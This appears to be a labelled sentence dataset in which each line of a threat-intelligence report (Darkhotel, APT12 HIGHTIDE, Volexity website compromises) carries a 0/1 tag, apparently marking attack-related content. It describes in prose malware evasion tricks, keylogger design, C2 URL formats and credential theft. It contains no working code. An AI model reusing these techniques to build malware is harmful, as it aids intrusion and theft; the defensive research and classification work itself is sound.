The attacks follow the typical spear-phishing process and in the past couple of months , exploited systems retrieved downloader executables from web servers like Over the past few years the group has emailed links that redirect targets ' brows- ers to Internet Explorer 0-day exploits .	1
Sometimes the attachment itself includes an Adobe 0-day exploit .	1
This crew occasionally deploys 0-day exploits , but burns them when required .	0
In the past few years , they deployed 0-day spear-phishing attacks targeting Adobe products and Microsoft Internet Explorer , including cve­2010­0188 .	1
In early 2014 , our researchers exposed their use of cve­2014­0497 , a Flash 0-day described on Securelist in early February .	0
The crew spear-phished a set of target systems connected to the Internet through Chinese ISPs , and developed capabilities within the 0-day exploits to handle hardened Windows 8.1 systems .	1
It 's interesting that the Flash objects were embedded in Korean documents titled '' List of the latest Japanese AV wind and how to use torrents.docx '' ( loose English translation ) .	1
The dropped downloader ( d8137ded710d83e2339a97ee78494c34 ) delivered malcode similar to the '' Information Stealer '' component functionality summarized below , and detailed in Appendix D .	1
The Darkhotel actors typically sign their backdoors with digital certificates of one kind or another .	0
However , the certificates originally chosen by this crew are very interesting because of their weak keys and likely abuse by attackers .	0
Here is a listing of the certs that were commonly used to sign Darkhotel malcode , requiring advanced mathematical capabilities to factorize the keys at the time .	0
They are not the only certificates used by the group .	0
More recent activity suggests that the group has stolen certificates to sign their code .	0
All related cases of signed Darkhotel malware share the same Root Certificate Authority and Intermediate Certificate Authority that issued certificates with weak md5 keys ( RSA 512 bits ) .	0
We are confident that our Darkhotel threat actor fraudulently duplicated these certificates to sign its malware .	0
These keys were not stolen .	0
Many of the certificates were noted in a 2011 Fox­IT post '' RSA­512 Certificates Abused in the Wild '' .	0
To further support this speculation please note the non­specific Microsoft Security Advisory below , the Mozilla advisory addressing the issue at the time , and the Entrust responses .	0
From Microsoft 's security advisory from Thursday , November 10 , 2011 : '' Microsoft is aware that DigiCert Sdn .	0
Bhd , a Malaysian subordinate certifica- tion authority ( CA ) under Entrust and GTE CyberTrust , has issued 22 certifi- cates with weak 512 bit keys .	0
These weak encryption keys , when broken , could allow an attacker to use the certificates fraudulently to spoof content , perform phishing attacks , or perform man­in­the­middle attacks against all Web browser users including users of Internet Explorer .	1
While this is not a vulnerability in a Microsoft product , this issue affects all supported releases of Microsoft Windows .	0
There is no indication that any certificates were issued fraudulently .	0
Instead , cryptographically weak keys have allowed some of the certificates to be dupli- cated and used in a fraudulent manner .	0
Microsoft is providing an update for all supported releases of Microsoft Windows that revokes the trust in DigiCert Sdn .	0
Bhd .	0
The update revokes the trust of the following two intermediate CA certificates : Digisign Server ID – ( Enrich ) , issued by Entrust.net Certification Authority ( 2048 ) Digisign Server ID ( Enrich ) , issued by GTE CyberTrust Global Root '' From Mozilla 's 2011 response : '' While there is no indication they were issued fraudulently , the weak keys have allowed the certificates to be compromised .	0
Furthermore , certificates from this CA contain several technical issues .	0
They lack an EKU extension specifying their intended usage and they have been issued without revocation information .	0
'' From Entrust 's response : '' There is no evidence that the Digicert Malaysia certificate authorities have been compromised .	0
'' Here are some notes on the costs and technical requirements of attacking these certificates .	0
The computing power required to crack and factor an RSA 512 bit key was $ 5000 and the period of time required was about 2 weeks .	0
( see http : //lukenotricks .	0
blogspot.co.at/2010/03/rsa­512­factoring­service­two­weeks.html ) In October 2012 , Tom Ritter reported that it would cost about $ 120­- $ 150 , per- haps even as little as $ 75 .	0
Going even further back , there was much discussion about the technical meth- ods of cracking these keys : DJ Bernstein 's 2001 paper on building a machine reducing the cost of integer factorization with Number Field Sieve techniques , breaking 1024 bit RSA keys .	0
RSA 's reaction and 2002 statement on whether or not 1024 bit RSA keys are broken : '' NIST offered a table of proposed key sizes for discussion at its key man- agement workshop in November 2001 [ 7 ] .	0
For data that needs to be protected no later than the year 2015 , the table indicates that the RSA key size should be at least 1024 bits .	0
For data that needs to be protected longer , the key size should be at least 2048 bits .	0
'' Recent Tapaoux attacks and backdoors include malware signed with strong SHA1/RSA 2048 bit certificates , suggesting certificate theft .	0
One of the most interesting components that we discovered as a part of this cam- paign was the use of a digitally­signed advanced keylogger .	1
It is clean , well­written , kernel level malcode .	0
The languages of its strings are a mix of English and Korean .	0
It is signed with the familiar '' belinda.jablonski @ syniverse.com '' digital certificate .	0
This keylogger is dropped by code running within svchost.exe on WinXP SP3 , which maintains an interesting debug string : It probably was developed as a part of a mid-to-late 2009 project : e : \project\2009\x\totalsource\32bit\ndiskpro\src\ioman.c This driver package is built to resemble a legitimate low-level Microsoft system device .	1
It is installed as a system kernel driver '' Ndiskpro '' service , described as a '' Microcode Update Device '' .	1
It is slightly surprising that no rootkit functionality hides this service : When loaded , the NDISKPRO.SYS driver hooks both INT 0x01 and INT 0xff , and retrieves keystroke data directly from port 0x60 , the motherboard keyboard con- troller itself .	1
It buffers , then communicates logged user data to the running user mode component .	0
This component then encrypts and writes the retrieved values ondisk to a randomly named .tmp , file like ffffz07131101.tmp .	1
This file is located in the same directory as the original dropper , which maintains persistence across reboots with a simple addition to the HKCU run key .	1
This keylogger module encrypts and stores gathered data in a log file , as men- tioned previously .	1
Its encryption algorithm is similar to RC4 .	0
The interesting part is that the module randomly generates the key and stores it in an unexpected place : in the middle of the log file name .	0
Hence , the numeric part of the filename is used as a seed for the pseudorandom number generator .	0
The rand function is statically linked to ensure same results on different computers .	0
The Darkhotel toolset consists of multiple components that have been slightly modified over time .	0
These tools are dropped by hotel installers spoofing legiti- mate software installers , bound within torrent bundles , or dropped by exploits or hypertext linked from spear-phishing emails .	1
More advanced tools , like the keylogger decribed above , are later downloaded to the victim system by one of these implants .	1
In a recent case , word docs embed- ded with 0-day flash swf files either dropped these backdoors or downloaded and executed backdoors from remote web servers .	1
These tools pull down the keylog- ger , steal information from the system , or download other tools .	1
The most interesting behaviors of these components include This module is quite small ( 27Kb ) and comes as a part of WinRar SFX file that drops and starts the module from % APPDATA % \Microsoft\Crypto\DES64v7\msieckc.exe .	1
This module is designed to update malicious components through recurring checks at the C & C server .	1
It is also capable of removing some older components , the names of which are hardcoded in the body of the malware .	1
The module adds autorun registry settings to enable an automatic start during system boot .	1
One of the most interesting functions of this executable is its unusual delay and persistence .	1
If a special file exists on the system , the module will not start calling back to C & C server until the special file is 180 days old .	0
So , if some other critical malicious component was removed during this period , current module backs up and restores access to the system within 6 months .	1
The component gathers system information and sends it to the Darkhotel com- mand and control servers as detailed in Appendix D. This module is relatively large ( 455Kb ) and comes as a part of a WinRar SFX file that drops and starts the module from % APPDATA % \Microsoft\Display\DmaUp3 . exe .	1
The main purpose of the module is to collect various secrets stored on a lo- cal system and upload them to Darkhotel command and control servers : This module is designed to terminate itself on Windows with the system de- fault codepage set to Korean .	1
This malware is 220Kb in size .	0
It was built as MFC framework application with a lot of extra calls that should have complicated the analysis of the sample .	1
It mim- ics a GUI desktop application but it does not create any visible windows or dialogs to interact with local users .	1
The Trojan collects data about the system and anti­ malware software installed on it , and uploads that data to Darkhotel command and control servers .	1
More technical details are provided in Appendix D. This malware is 63kb in size .	0
It is bound to a variety of other software packages that vary in name , but the host package is consistently detected as '' Virus.Win32 .	1
Pioneer.dx '' .	0
It drops the igfxext.exe '' selective infector '' component to disk and runs it .	1
This component is a virus , and is used to selectively infiltrate into other comput- ers via USB or network shares .	1
First , the virus retrieves all available disks and starting from disk number 4 ( D : \ ) to disk number 20 ( Z : \ ) , finds executable files and infects them .	1
The code simply brute forces the list of mapped removable drives .	1
During its infection routine , the infector changes the entrypoint of executable files , creates an .rdat section , and inserts a small loader in the section , then puts its main payload in the overlay .	1
Every infected file has functionality described in Trojan­Dropper & Injector section , so it can collect information about the comput- er , send it to the C2 and download other Darkhotel components as commanded .	1
Observed downloaded components are signed with a familiar expired certificate from www.esupplychain.com.tw , issued by Cybertrust SureServer CA .	0
Again , further technical details are provided in Appendix D. Almost every backdoor in this set maintains an internal campaign code or id , used in initial c2 communications as described above .	1
Some IDs appear to be related to geographic interests , others do not seem obvious .	0
We gathered a list of Darkhotel campaign IDs shown below .	0
Internal IDs and c2 resources overlap across these com- ponents , there is no pattern of distribution according to connectback resources .	0
The most common id is '' DEXT87 '' : This infrastructure team appears to employ a lesser skillset than top notch campaigns , maintaining weak server configurations with limited monitoring and defensive reactions , and making some simple mistakes .	0
However , they are ef- fective at maintaining a fully available infrastructure to support new and existing infections .	0
Overall , victims in our sinkhole logs and KSN data were found across the globe , with the majority in Japan , Taiwan , China , Russia , Korea and Hong Kong .	0
The following C & C domains have been sinkholed and redirected to the Kaspersky Sinkhole Server Our Kaspersky Security Network detected Darkhotel infections across thousands of machines , mostly related to the Darkhotel p2p campaigns .	0
These geolocation estimates probably provide the most accurate picture of where Darkhotel activity is occurring .	0
Here is a pie chart to better visualize the proportions of attack activity throughout the world .	0
As you can see , over 90 % of it occurs in the top five countries : Japan , followed by Taiwan , China , Russia and Korea .	0
Because the operators very actively build up new command and control serv- ers , it is difficult to sinkhole enough domains to get an accurate overall picture of victim system location based on this data .	1
Also , many researcher systems are connected to the sinkholed domains .	0
However , this graph of current sinkhole callbacks presents a low confidence distribution of victim geolocation , with India , Japan , Ireland , Korea , China and Taiwan in the top slots .	0
Removing India and Ireland , the set more closely matches our KSN data .	0
Many of these c2s maintain a common directory path that serves a ddrlog .	1
The ddrlogs appear to maintain callback data that the attackers want to set aside in error logs .	0
Many of the callback URLs have errors , many are from unwanted IP ranges , and others are clearly unwanted researcher sandbox system callbacks .	0
A description of the detailed connectback URL values and their xor/base64 encoding scheme is included in the '' Interesting Malware Trojan.Win32.Karba.e '' technical notes in Appendix D. The Darkhotel c2 maintain these directory structures to store and serve ddrlog content : The following structures appear to be common across servers , but do not pro- duce ddrlog and do not maintain an /error/ directory : Two ddrlog files report entries starting January 1 , 2009 at 9:16 a.m. All of the logs maintain a significant number of entries , almost 50,000 , with a simple stamp '' B '' or '' L '' .	1
Those records are formatted in the following manner : Only 120 IP addresses perform the '' B '' checkin , and 90 % of these are from the range 150.70.97.x .	0
This entire range is owned by Trend Micro in Tokyo , JP .	0
A handful of the remaining addresses , like 222.150.70.228 , appear to come from other ranges owned by Trend Micro in JP .	0
One outlier comes from an El Sal- vadoran ISP , and another is connected to a Japanese ISP .	0
Approximately 20,000 IP addresses perform the '' L '' checkin .	0
Other ddrlogs may include '' A '' tags as well .	0
The '' A '' tag labels unwanted checkins from untargeted locations , like Hungary and Italy .	0
The '' B '' tag labels unwanted checkins from Trend Micro IP ranges .	0
The '' L '' tag labels unwanted checkins from a variety of ranges , but includes odd IP like the loopback address , 127.0.0.1 , clearly an error .	0
Entries in these logs include callback URLs that have spaces and unusual charac- ters that do not conform to the required base64 character dictionary .	0
Typical main page : For begatrendstone.com , we have the following directory structure : The group encrypts victim data on their servers with single user/passkey combi- nations across multiple victims .	1
When an unauthorized user attempts to access a Darkhotel web interface for victim management without the correct passkey , the html page and table layout renders properly , but all the data values on the page are returned as garbled ciphertext .	0
New victim systems appear to be systematically vetted .	1
The attackers maintain a web interface to vet these new victim systems .	1
The attackers first and foremost list and sort victim systems according to their latest c2 check­in .	1
Collected data probably is presented in order of importance : Here is an example of one of these web pages : Clearly , some automated analysis activity involving researchers ' sandbox tools are filling up these logs .	0
From June 2013 to April 2014 ( approximately an 11 month period ) , in only 15 ddrlog files , we observe almost 7,000 connections from research sandbox systems .	0
The network connections provide a1= through a3= values identifying a QEMU based sandbox , all sourced from only 485 WAN IP ad- dresses .	0
Under 30 lan IPs are recorded , all in the same 172.16.2.14­126 range .	0
This system ( s ) uses a '' Dave '' user account and '' HOME­OFF­D5F0AC '' Windows system name .	0
These characteristics correspond with network activity generated by GFI Soft- ware 's '' CWsandbox '' tools , now owned by '' ThreatTrack Security '' .	0
For the past seven years , a strong threat actor named Darkhotel , also known as Tapaoux , has carried out a number of successful attacks against a wide range of victims from around the world .	0
It employs methods and techniques which go well beyond typical cybercriminal behavior .	0
The Darkhotel crew 's skillset allows it to launch interesting cryptographical at- tacks , for instance factoring 512 bit RSA keys .	0
Its use of 0-days is another indica- tor of a strong threat actor .	0
The targeting of top executives from various large companies around the world during their stay at certain '' Dark Hotels '' is one of the most interesting aspects of this operation .	0
The exact method of targeting is still unknown - for instance , why some people are targeted while others are not .	0
The fact that most of the time the victims are top executives indicates the attackers have knowledge of their victims whereabouts , including name and place of stay .	0
This paints a dark , dangerous web in which unsuspecting travelers can easily fall .	0
While the exact reason why some hotels function as an attacker vector are unknown , certain suspicions ex- ist , indicating possibly a much larger compromise .	0
We are still investigating this aspect of the operation and will publish more information in the future .	0
A further interesting trait is the deployment of multiple types of campaigns , both targeted and botnet .	0
This is becoming more and more common on the APT scene , where targeted attacks are used to compromise high profile victims and botnet style operations are used for massive surveillance or performing other tasks such as launching DDoS attacks on hostile parties or simply upgrading victims to more sophisticated espionage tools .	1
We expect the Darkhotel crew to continue their activities against DIB , Govern- ment and NGO sectors .	0
The appendix released with this paper provides technical indicators of compromise which should help victims identify the malicious traffic and enable targets to protect themselves better against attack .	0
Downloaders , injectors , infostealers Example md5s of files detected with Kaspersky 's Virus.Win32.Pioneer.dx and Symantec 's Infostealer.Nemim ! inf : To ensure only single instance of the module is running , the module verifies if system mutex named «132DF6E» exists .	1
If it exists the module exits , if not ­the module creates one .	0
The module implements a method to resist running in virtual environment .	1
It gets CPU name and identifier from the registry at HKLM\HARDWARE\DESCRIPTION\ System\CentralProcessor\0 and collects IP and MAC addresses of local network adapters .	1
After that it compiles a string describing the system in the following format : « C P U : % CPUNAME % < br > Net card : % IP % ( % MACADDR % ) < br > » .	0
Next it checks if this string contains one of the following substrings : If any of these strings is found , the module terminates .	0
After that , there is a hardcoded value of 10 , which delays further execution of the module for 10 seconds .	0
Then the module attempts to delete some other , prob- ably older , components which might be present on the system .	1
The list of deleted files includes the following : The next is step is to check if current directory has a file named «U» .	1
If not , the module proceeds with network communication routine .	0
But if this file is found it does some additional checks .	0
If «U» file is older than 180 days , the module wipes the file .	1
If not , it triggers a special variable that makes module dormant and dis- ables further communication with C & C server .	1
After all , if the module is ready and allowed to communicate with C & C server it does that in the following manner .	0
1 .	0
The module connects to autolace.twilightparadox.com ( or automachine . servequake.com ) and issues a HTTP GET request with hardcoded User­Agent string : The server response should contain «DEXT87» string which is used to rec- ognize valid response .	1
The malware locates «DEXT87» and reads the data appended to it .	0
The appended data should be an IP address in plaintext .	0
This is used a real C & C IP address .	0
Reading stops when non­digit or dot symbol is found .	0
Here is an example of shortest possible valid server response : 2 .	0
If the real C & C IP address is not valid the module may try to send identical request again but using a different HTTP path : If the C & C IP address is valid , the module issues another HTTP request : The server response can be one of the following : Where < DATASIZE > is a decimal integer that represents length of < DATA > field in bytes; < DATA > is a binary data separated from < DATASIZE > field by semicolon .	1
Please note , that after receiving < DATA > , it is XORed with byte value 0x55 and saved to a disk in a file named «ctfmon.exe» ( current directory is used ) .	1
Upon successful receiving of the file it is started in a new process .	0
This module is relatively large ( 455Kb ) and comes as a part of WinRar SFX file that drops and starts the module from % APPDATA % \Microsoft\Display\DmaUp3 . exe .	1
The main purpose of the module is to collect various secrets stored on a local system .	1
This module is designed not to run on Windows with system default codepage set to Korean .	0
From the very beginning this module checks if «bdagent.exe» process is running on current system .	1
Bdagent.exe is a name for BitDefender Antivirus component .	0
If it is running , it uses simple AV heuristics evasion technique .	1
The code starts a thread that simulates keystrokes of ESC keyboard key and then shows a system modal message box .	1
Pushing ESC key closes the modal message box .	0
Right after that keystroke generation thread is terminated and the module continues normal execution as if «bdagent.exe» was not running .	1
Next the module makes sure only one instance of current code is running by checking if system mutex object named «920111215» exists .	1
After that , the mod- ule collects information about current system which includes the following : If the module reveals that current System default codepage is 0412 ( Korean ) it terminates .	1
There is one interesting specifics in Microsoft IntelliForms which reveals attack- er 's interests .	0
IntelliForms technology keeps login/password information in the registry in encrypted form .	0
However , there is no clear information about the corre- sponding website which requires given login and password .	0
The only information Intelliforms offers about the place where given login/password should be used is a hash of the webpage URL .	0
So far , the attackers can steal logins and pass- words but to understand where they are from they must guess the string which produced given hash .	1
They have implemented this logics in the malware .	0
When IntelliForms information is stolen the malware tries to check the list of known login page URLs to recover the originating webpage address .	1
Here is the list of URLs that are checked by the malware : The list of targeted services includes some local services specifically popular in : The module uses several simple XOR­based algorithms to encrypt embedded string data .	1
String encryption/decryption functions use the following keys : The module works with all Firefox versions prior to Mozilla Firefox 12.0 .	0
Depend- ing on version of Firefox , it can read Firefox database directly to dump stored se- crets or utilize one Firefox libraries to access the configuration data .	0
In addition it makes use of the following Mozilla Firefox libraries depending on Firefox version : When stealing secrets from Firefox and Chrome it uses built­in SQLite library code .	1
The module is linked with SQLite version 3.7.5 release candidate 2 , release hash ed759d5a9edb3bba5f48f243df47be29e3fe8cd7 dated as 2011­01­28 17:03:50 .	0
After stealing secrets from local system the malware executes some kind of embedded script .	1
It is logging all actions to inform the operator what exactly was executed by this variant of the malware .	1
The result of this execution is appended to the stolen data and uploaded to the C & C server .	1
The module uploads all collected information to one of the following URLs via POST request : It 's the first time we see .pn	1
domain used in malware .	0
This top level country code domain is quite exotic and is assigned to Pitcairn Islands , which is Overseas ter- ritory of the United Kingdom in the Pacific .	0
As of 2013 estimated population of Pitcairn Islands is only 56 people .	0
An official .pn	0
domain costs $ 100/year from the registry , however .eu.pn	0
domains seem to be given away for free .	0
The malware uses fixed User­Agent string : The data is uploaded as a POST request binary in the following format : where < UserId > is hardcoded identifier ( i.e .	1
«user2» in current sample ) ; < UniqueMachineId > is a 32 characters long hex string which derived from net- work card MAC address; < EncryptionKey > is symmetrical encryption key used to encrypt < UserId > and < GeneralSysInfo > values .	0
The malware uses text protocol , which is why potentially binary values of < UserId > and < GeneralSysInfo > are ad- ditionally encoded using Base64 algorithm .	0
< GeneralSysInfo > field contains only basic information about the system , i.e .	0
: If the server reply contains a keyword «minmei» it continues sending additional in- formation .	1
«Minmei» may be a reference to a popular Japanese anime and manga known as «The Super Dimension Fortress Macross» .	0
A quote from Wikipedia : «Born in Yokohama Chinatown , Japan ( though she is of partial Chinese descent ) as Linn Minmei , Minmay moved in with her uncle Shaochin ( 少江 ) and aunt Feic- hun ( 慧中 ) on South Ataria Island in hopes of finding the path to fulfill her dream of becoming a star.» The trojan iterates through running processes and looks for security software basing on executable filenames from the list below .	1
If the process is found it keeps a record of the software name using short AV Identifier string from the fol- lowing table of rules The malware uses a trick to evade running on a VMware .	1
First , it checks if cur- rent process is running in WOW64 environment .	1
If yes it does additional port I/O specific to VMWare virtual machine ( the VMware hypervisor port : 0x5658; VMware hypervisor magic value : 0x564D5868 ) .	0
Another method to detect VM en- vironment is to check local network adapter 's IP address .	1
If it belongs to subnet 192.168.100 .	0
* then the malware believes it 's running in a VM .	0
If VM is detected the process instantly terminates .	1
Next the malware submits collected information to the C & C server using HTTP GET request and the following URL format : http : // < C2DOMAIN > /bin/readi.php ? a1= % STEPID % & a2= % HOSTID % & a3= % SYSINFO % & a4= % AVSOFTID % , where % C2DOMAIN % is one of the following C & C domains : % STEPID % is special text string indicating stage of malware operation .	1
This string varies depending on the local system language and may be one of the following : % HOSTID % is a special value generated from local network card MAC address; % SYSINFO % is a string with general system information ( please see description above ) ; % AVSOFTID % is a string that contains indexes of AV software names in internal table of AV Identifiers ( please see the table above ) .	0
Igfxext.exe can download a file and drop it to % APPDATA % \microsoft\dis- play\ctfmon.exe ( md5= e8bfb82b0dd5cef46116d61f62c25060 ) .	1
After execution , the downloaded file drops SMAGENT.EXE ( md5 0306f9ae- 7786570139f78e78bc940597 ) to % APPDATA % \MICROSOFT\DISPLAY and ex- ecutes it .	1
This component is a virus , and is used to selectively infiltrate into other computers via USB or network shares .	1
A large number of files are detected by Kaspersky Lab scanners as Virus.Win32 .	0
Pioneer.dx .	0
These files are all legitimate files that have been infected by another Darkhotel component .	1
All of these infected files drop a 63kb self injecting compo- nent .	1
This malware is 63kb in size .	0
It is bound to a variety of other software packages that vary in name , but the host package is consistently detected as '' Virus.Win32 .	0
Pioneer.dx '' .	0
The igfxext.exe component is dropped to disk and run .	1
It spawns an- other suspended process with its own igfxext.exe image , but decrypts a smaller 32kb executable ( cf1319d94f33380622ba000b7d8ad6e9 , Trojan­Downloader .	1
Win32.Agent.xwge ) from its .data	0
section in memory with a simple xor 0xbb .	0
The running process overwrites the igfxext.exe image in the suspended process with this smaller chunk of code .	1
It then resumes the thread in the new process .	0
This smaller code section maintains similar functionality to the '' worm '' compo- nent : Host package files detected as '' Virus.Win32.Pioneer.dx '' are infected legitimate files , that do not have any self­propagation routines .	1
It is signed with the familiar '' '' digital certificate .	0
This sample is started by code running within svchost.exe on WinXP SP3 .	1
It drops a keylogger .	1
The debug path inside : The dropper above maintains , drops and installs this kernel mode keylogger : Likely , it was developed as a part of a mid­to­late 2009 project : This driver package is built to look like a legitimate low level Microsoft system device .	1
It is installed as a system kernel driver '' Ndiskpro '' service , described as a '' Microcode Update Device '' .	1
It is somewhat surprising that there is no rootkit functionality hiding this service : When loaded , the NDISKPRO.SYS driver hooks both INT 0x01 and INT 0xff , and retrieves keystroke data directly from port 0x60 , the motherboard keyboard con- troller itself .	1
Here we see the local port variables assigned values And here , the ports are directly being read with READPORTUCHAR ( 0x64 ) and then READPORTUCHAR ( 0x60 ) : It buffers , then communicates the data to the running user mode component .	0
This component then encrypts and writes the retrieved values ondisk to a ran- domly named .tmp , file like ffffz07131101.tmp .	1
This file is located in the same directory as the original dropper , which maintains persistence across reboots with a simple addition to the HKCU run key .	1
Here is debug output demonstrating this component 's data retrieval when the letter '' D '' is repeatedly pressed on the keyboard .	0
Keyscan make and break codes are '' 0x20 '' and '' 0xA0 '' and for the key press and key release for the '' D '' key .	0
The '' 0x1D '' value from port 0x64 that you see below is basically an indication that the output buffer is full and the keyboard is locked , so it is safe for the driver to access the key value in port 0x60 : These debug messages and code style are duplicates of what chpie posted in the past .	0
This keylogger module encrypts and stores gathered data in a log file , as men- tioned previously .	1
Its encryption algorithm is similar to RC4 .	0
Interesting part is that the module randomly generates the key and stores it in an unexpected place : in the middle of the log file name .	0
Hence , the numeric part of the filename is used as a seed for the pseudorandom number generator .	0
Rand function is statically linked to insure same results on different computers .	0
The attackers referred to as APT12 ( also known as IXESHE , DynCalc , and DNSCALC ) recently started a new campaign targeting organizations in Japan and Taiwan .	0
APT12 is believed to be a cyber espionage group thought to have links to the Chinese People 's Liberation Army .	0
APT12′s targets are consistent with larger People 's Republic of China ( PRC ) goals .	0
Intrusions and campaigns conducted by this group are in- line with PRC goals and self - interest in Taiwan .	0
Additionally , the new campaigns we uncovered further highlight the correlation between APT groups ceasing and retooling operations after media exposure , as APT12 used the same strategy after compromising the New York Times in Oct 2012 .	0
Much like Darwin 's theory of biological evolution , APT12 been forced to evolve and adapt in order to maintain its mission .	0
The new campaign marks the first APT12 activity publicly reported since Arbor Networks released their blog " Illuminating The Etumbot APT Backdoor . " FireEye refers to the Etumbot backdoor as RIPTIDE .	0
Since the release of the Arbor blog post , FireEye has observed APT12 use a modified RIPTIDE backdoor that we call HIGHTIDE .	0
This is the second time FireEye has discovered APT12 retooling after a public disclosure .	0
As such , FireEye believes this to be a common theme for this APT group , as APT12 will continue to evolve in an effort to avoid detection and continue its cyber operations .	0
FireEye researchers also discovered two possibly related campaigns utilizing two other backdoors known as THREEBYTE and WATERSPOUT .	0
Both backdoors were dropped from malicious documents built utilizing the " Tran Duy Linh " exploit kit , which exploited CVE-2012 - 0158 .	1
These documents were also emailed to organizations in Japan and Taiwan .	0
While APT12 has previously used THREEBYTE , it is unclear if APT12 was responsible for the recently discovered campaign utilizing THREEBYTE .	0
Similarly , WATERSPOUT is a newly discovered backdoor and the threat actors behind the campaign have not been positively identified .	0
However , the WATERSPOUT campaign shared several traits with the RIPTIDE and HIGHTIDE campaign that we have attributed to APT12 .	0
From October 2012 to May 2014 , FireEye observed APT12 utilizing RIPTIDE , a proxy - aware backdoor that communicates via HTTP to a hard - coded command and control ( C2 ) server .	1
RIPTIDE 's first communication with its C2 server fetches an encryption key , and the RC4 encryption key is used to encrypt all further communication .	0
In June 2014 , Arbor Networks published an article describing the RIPTIDE backdoor and its C2 infrastructure in great depth .	0
The blog highlighted that the backdoor was utilized in campaigns from March 2011 till May 2014 .	0
Following the release of the article , FireEye observed a distinct change in RIPTIDE 's protocols and strings .	0
We suspect this change was a direct result of the Arbor blog post in order to decrease detection of RIPTIDE by security vendors .	1
The changes to RIPTIDE were significant enough to circumvent existing RIPTIDE detection rules .	0
FireEye dubbed this new malware family HIGHTIDE .	0
On Sunday August 24 , 2014 we observed a spear phish email sent to a Taiwanese government ministry .	1
Attached to this email was a malicious Microsoft Word document ( MD5 : f6fafb7c30b1114befc93f39d0698560 ) that exploited CVE-2012 - 0158 .	0
It is worth noting that this email appeared to have been sent from another Taiwanese Government employee , implying that the email was sent from a valid but compromised account .	0
The exploit document dropped the HIGHTIDE backdoor with the following properties .	1
The HIGHTIDE backdoor connected directly to 141.108.2.157 .	0
If you compare the HTTP GET request from the RIPTIDE samples ( Figure 1 ) to the HTTP GET request from the HIGHTIDE samples ( Figure 3 ) you can see the malware author changed the following items .	0
User Agent Format and structure of the HTTP Uniform Resource Identifier ( URI ) Similar to RIPTIDE campaigns , APT12 infects target systems with HIGHTIDE using a Microsoft Word ( .doc ) document that exploits CVE-2012 - 0158 .	0
FireEye observed APT12 deliver these exploit documents via phishing emails in multiple cases .	1
Based on past APT12 activity , we expect the threat group to continue to utilize phishing as a malware delivery method .	1
When the file is opened , it drops HIGHTIDE in the form of an executable file onto the infected system .	1
RIPTIDE and HIGHTIDE differ on several points : executable file location , image base address , the User- Agent within the GET requests , and the format of the URI .	0
The RIPTIDE exploit document drops its executable file into the C:\Documents and Settings\{user}\Application Data\Location folder while the HIGHTIDE exploit document drops its executable file into the C:\DOCUMENTS and SETTINGS\ { user}\LOCAL SETTINGS\Temp\ folder .	1
All but one sample that we identified were written to this folder as word.exe .	0
The one outlier was written as winword.exe .	0
Research into this HIGHTIDE campaign revealed APT12 targeted multiple Taiwanese Government organizations between August 22 and 28 .	0
On Monday August 25 , 2014 we observed a different spear phish email sent from lilywang823@gmail.com to a technology company located in Taiwan .	1
This spear phish contained a malicious Word document that exploited CVE-2012 - 0158 .	1
The MD5 of the exploit document was e009b95ff7b69cbbebc538b2c5728b11 .	0
Similar to the newly discovered HIGHTIDE samples documented above , this malicious document dropped a backdoor to C:\DOCUMENTS and SETTINGS\{user}\LOCAL SETTINGS\Temp\word.exe .	1
This backdoor had the following properties .	0
This backdoor sent the following callback traffic to video[.]csmcpr[.]com .	0
The THREEBYTE spear phishing incident ( while not yet attributed ) shared the following characteristics with the above HIGHTIDE campaign attributed to APT12 .	0
On August 25 , 2014 , we observed another round of spear phishing emails targeting a high - technology company in Japan .	1
Attached to this email was another malicious document that was designed to exploit CVE-2012 - 0158 .	1
This malicious Word document had an MD5 of 499bec15ac83f2c8998f03917b63652e and dropped a backdoor to C:\DOCUMENTS and SETTINGS\{user}\LOCAL SETTINGS\Temp\word.exe .	1
The backdoor had the following properties .	0
The backdoor connects to a command and control server at icc[.]ignorelist[.]com .	0
Similar to RIPTIDE and HIGHTIDE , the WATERSPOUT backdoor is an HTTP - based backdoor that communicates with its C2 server .	1
Although there are no current infrastructure ties to link this backdoor to APT12 , there are several data points that show a possible tie to the same actors .	0
Although these points do not definitively tie WATERSPOUT to APT12 , they do indicate a possible connection between the WATERSPOUT campaign , the THREEBYTE campaign , and the HIGHTIDE campaign attributed to APT12 .	0
FireEye believes the change from RIPTIDE to HIGHTIDE represents a temporary tool shift to decrease malware detection while APT12 developed a completely new malware toolset .	0
These development efforts may have resulted in the emergence of the WATERSPOUT backdoor .	0
APT12 's adaptations to public disclosures lead FireEye to make several conclusions about this threat group .	0
Though public disclosures resulted in APT12 adaptations , FireEye observed only a brief pause in APT12 activity before the threat actors returned to normal activity levels .	0
Similarly , the public disclosure of APT12 's intrusion at the New York Times also led to only a brief pause in the threat group 's activity and immediate changes in TTPs .	0
The pause and retooling by APT12 was covered in the Mandiant 2014 M- Trends report .	0
Currently , APT12 continues to target organizations and conduct cyber operations using its new tools .	0
Most recently , FireEye observed HIGHTIDE at multiple Taiwan - based organizations and the suspected APT12 WATERSPOUT backdoor at a Japan - based electronics company .	0
We expect that APT12 will continue their trend and evolve and change its tactics to stay ahead of network defenders .	0
Note : IOCs for this campaign can be found here .	0
This entry was posted in Botnets , Targeted Attack , Threat Intelligence , Threat Research and tagged advanced malware , advanced persistent threat , advanced targeted attack , advanced threat actor , APT12 , Targeted Attack by Ned Moran , Mike Oppenheim , Sarah Engle and Richard Wartell .	0
Bookmark the permalink .	0
Posted on October 9 , 2014 by Steven Adair Over the last few months , Volexity has been tracking a particularly remarkable advanced persistent threat ( APT ) operation involving strategic web compromises of websites in Hong Kong and Japan .	0
In both countries , the compromised websites have been particularly notable for their relevance to current events and the high profile nature of the organizations involved .	0
In particular the Hong Kong compromises appear to come on the heels of the Occupy Central Campaign shifting into high gear .	0
These compromises were discovered following the identification of malicious JavaScript that had been added to legitimate code on the impacted websites .	1
This code meant that visitors were potentially subjected to exploit and malicious Java Applets designed to install malware on their systems .	1
While investigating these cases , Volexity also discovered additional APT attack campaigns involving multiple other pro - democratic websites in Hong Kong .	0
These attempts at exploitation , compromise , and digital surveillance are detailed throughout this post .	0
Warning : Many of these websites may still be compromised and present a risk to visitors .	0
Browse with caution .	0
Alliance for True Democracy € " Hong Kong Over the last two days , Volexity has observed malicious code being served up from the website of the Alliance for True Democracy ( ATD ) in Hong Kong ( www.atd.hk ) .	1
ATD is an alliance of people and organizations dedicated to democracy and universal suffrage in Hong Kong .	0
At the time of this writing malicious code is still live on the website , so please visit with care until the website is clean .	0
Below is a screen shot of the malicious code references found pre - pended to a JavaScript file on the website named superfish.js .	0
This JavaScript file is called from other parts of the website and effectively nests the loading of additional JavaScript written and interpeted as .	0
